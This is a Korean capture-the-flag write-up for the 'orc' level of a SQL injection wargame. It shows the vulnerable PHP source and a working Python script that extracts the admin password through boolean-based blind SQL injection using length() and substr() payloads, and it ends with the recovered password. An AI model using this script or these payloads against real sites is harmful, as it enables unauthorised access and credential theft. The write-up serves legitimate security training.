# 4번문제 orc

이제는 pw에 진짜 pw의 값을 넣어주어야지 해결이 되게 되었다.
pw='' or 1=1 같은 편법으로 해결이 되지 않는 경우다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```
이렇게 되면 이용해야 될 것은,
length()와 substr() 함수다.

length(문자열) 과 같이 하면, 문자열의 길이를 반환하고,
substr(문자열, 시작위치, 길이) 와 같이 하면, 문자열을 시작위치부터 개수만큼 짤라서 반환한다.

```python
import requests

pw_length = 0
pw = ''
url = 'https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php'
possible = [i for i in range(1, 10)] + [chr(i) for i in range(ord('a'), ord('z')+1)]
cookies = {'PHPSESSID': '3t38beb14phghl6lep6f86ems4', '__cfduid': 'd242d1b31e55a72f0891f924d39e400511592788190'}
# 쿠키는 개발자도구(F12)에 저장된 쿠키의 이름과 값을 딕셔너리로 가져옴

for i in range(100):
    if requests.get(url + f"?pw=' or length(pw)={i} -- '", cookies=cookies).text.count('Hello admin'):
        pw_length = i
        break
    else:
        print(f"{i} 은 아닌가벼...")
print(f'#### 찾았다! 비밀번호의 길이 : {pw_length}개')

for i in range(1, pw_length+1):
    print(f"#### {i}번째 위치의 비밀번호 ")

    for j in possible:
        jj = "'" + j + "'" if ord(str(j)) > ord('a') else j
        if requests.get(url + f"?pw=' or id='admin' and substr(pw, {i}, 1)={jj} -- '", cookies=cookies).text.count('Hello admin'):
            print(f"#### 찾았다! {i}번째 위치의 비밀번호 문자 : {j}")
            pw += str(j)
            break
        else:
            print(f"{j} 은 아닌가벼...")

print("최종 비밀번호 :", pw)
```
이렇게 코드로 추출한 비밀번호의 값을 pw 값에 넣어주면 끝이다.
```
https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=295d5844
query : select id from prob_orc where id='admin' and pw='295d5844'
```
